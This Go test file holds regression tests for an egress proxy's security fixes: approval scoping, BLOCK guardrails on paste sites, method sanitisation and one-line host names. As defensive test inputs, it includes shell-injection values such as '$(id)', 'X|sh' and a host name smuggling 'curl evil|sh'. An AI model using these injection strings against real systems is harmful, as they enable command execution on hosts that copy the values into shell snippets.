package store

import (
	"strings"
	"testing"
	"time"

	"aegisproxy/control-plane/internal/engine"
	"aegisproxy/control-plane/internal/models"
)

// Regression tests for the 2.1 security review findings.

func TestLearningSessionApprovalUsesServerGroups(t *testing.T) {
	st := newTestStore(t, t.TempDir(), false)
	setupFleet(t, st) // srv-vault-1 (10.9.0.5) is in the strict-isolation group grp-vault
	req, _, err := st.CreateAccessRequest(models.AccessRequest{ServerIP: "10.9.0.5", RequestedURL: "https://exfil.example/x", Host: "exfil.example",
		Path: "/x", Requester: "ops", Reason: "debug", Duration: "24h", RequestedScope: "learning_session_15m"})
	if err != nil {
		t.Skipf("learning-session scope not offered by the default template: %v", err)
	}
	// A Team Lead of another group names their own group as target: refused (the request is outside
	// their scope, so it does not exist for them).
	if _, _, err := st.ReviewAccessRequest(req.ID, ReviewOptions{Approve: true, TargetGroupIDs: []string{"grp-ci"}}, teamLeadCI); err == nil || err.Error() != "request not found" {
		t.Fatalf("team lead of grp-ci approved a session for the vault server: %v", err)
	}
	// Even InfoSec cannot open a session on a strict-isolation server by naming another target group.
	if _, _, err := st.ReviewAccessRequest(req.ID, ReviewOptions{Approve: true, TargetGroupIDs: []string{"grp-ci"}}, adminClaims); err == nil || !strings.Contains(err.Error(), "strict-isolation") {
		t.Fatalf("session on a strict-isolation server approved: %v", err)
	}
	if res := st.Evaluate(engine.EvaluationRequest{ServerIP: "10.9.0.5", Method: "GET", Host: "exfil.example", Path: "/x"}); res.Allowed {
		t.Fatalf("vault server got egress: %+v", res)
	}
}

func TestTeamLeadCannotWithdrawGuardrailsBySetChanges(t *testing.T) {
	st := newTestStore(t, t.TempDir(), false)
	setupFleet(t, st)
	set := publishSet(t, st, adminClaims, "CI egress", []string{"grp-ci"},
		models.PolicyRule{Name: "pkgs", Action: "ALLOW", HostPattern: "pkgs.example.org", PathPattern: "/**", Enabled: true},
		models.PolicyRule{Name: "No paste sites", Action: "BLOCK", HostPattern: "pastebin.com", PathPattern: "/**", Enabled: true})
	cur, _ := st.PolicySet(set.ID)
	disabled := cloneSpec(cur.PolicySetSpec)
	disabled.Enabled = false
	if _, err := st.SaveDraft(set.ID, disabled, teamLeadCI); err == nil || !strings.Contains(err.Error(), "guardrail") {
		t.Fatalf("team lead disabled a set holding a BLOCK guardrail: %v", err)
	}
	rescoped := cloneSpec(cur.PolicySetSpec)
	rescoped.GroupIDs = []string{}
	rescoped.ServerIDs = []string{"srv-ci-1"}
	if _, err := st.SaveDraft(set.ID, rescoped, teamLeadCI); err == nil {
		t.Fatal("team lead re-scoped a set holding a BLOCK guardrail")
	}
	// Disabling the ALLOW rule only is fine for the Team Lead.
	onlyAllow := cloneSpec(cur.PolicySetSpec)
	for i := range onlyAllow.Rules {
		if onlyAllow.Rules[i].Action == "ALLOW" {
			onlyAllow.Rules[i].Enabled = false
		}
	}
	if _, err := st.SaveDraft(set.ID, onlyAllow, teamLeadCI); err != nil {
		t.Fatalf("team lead could not disable their ALLOW rule: %v", err)
	}
	if res := st.Evaluate(engine.EvaluationRequest{ServerIP: "10.1.0.5", Method: "GET", Host: "pastebin.com", Path: "/x"}); res.Allowed {
		t.Fatal("guardrail no longer enforced")
	}
	// InfoSec may still disable the set.
	if _, err := st.SaveDraft(set.ID, disabled, adminClaims); err != nil {
		t.Fatalf("InfoSec could not disable the set: %v", err)
	}
}

// R3-2: the request method of a flow is copied into curl snippets of the console. HTTP allows shell
// metacharacters in a method token, so only method-like values are stored.
func TestFlowMethodIsSanitized(t *testing.T) {
	for in, want := range map[string]string{
		"":                   "",
		"get":                "GET",
		"PROPFIND":           "PROPFIND",
		"VERSION-CONTROL":    "VERSION-CONTROL",
		"M-SEARCH":           "M-SEARCH",
		"GET`id`":            "INVALID",
		"X|sh":               "INVALID",
		"$(id)":              "INVALID",
		"A&B":                "INVALID",
		"GET'":               "INVALID",
		"GET X":              "INVALID",
		"-OUTPUT":            "INVALID",
		"GÉT":                "INVALID",
		"AVERYLONGMETHODXYZ": "INVALID",
	} {
		if got := sanitizeFlow(models.TrafficFlow{ID: "flw-1", Method: in}, time.Now(), 0, "").Method; got != want {
			t.Errorf("method %q stored as %q, want %q", in, got, want)
		}
	}
}

// R3-2: server host names end up in one-line contexts (snippet comments, audit summaries).
func TestServerHostnameMustBeOneLine(t *testing.T) {
	st := newTestStore(t, t.TempDir(), false)
	for _, h := range []string{"web-1\ncurl evil|sh", "web-1\tx", "web-1\rx"} {
		if _, err := st.UpsertServer(models.Server{ID: "srv-nl", Hostname: h, IP: "10.7.0.9"}, adminClaims); err == nil {
			t.Errorf("hostname %q accepted", h)
		}
	}
	if _, err := st.UpsertServer(models.Server{ID: "srv-nl", Hostname: "web-1.corp.example", IP: "10.7.0.9"}, adminClaims); err != nil {
		t.Fatal(err)
	}
}
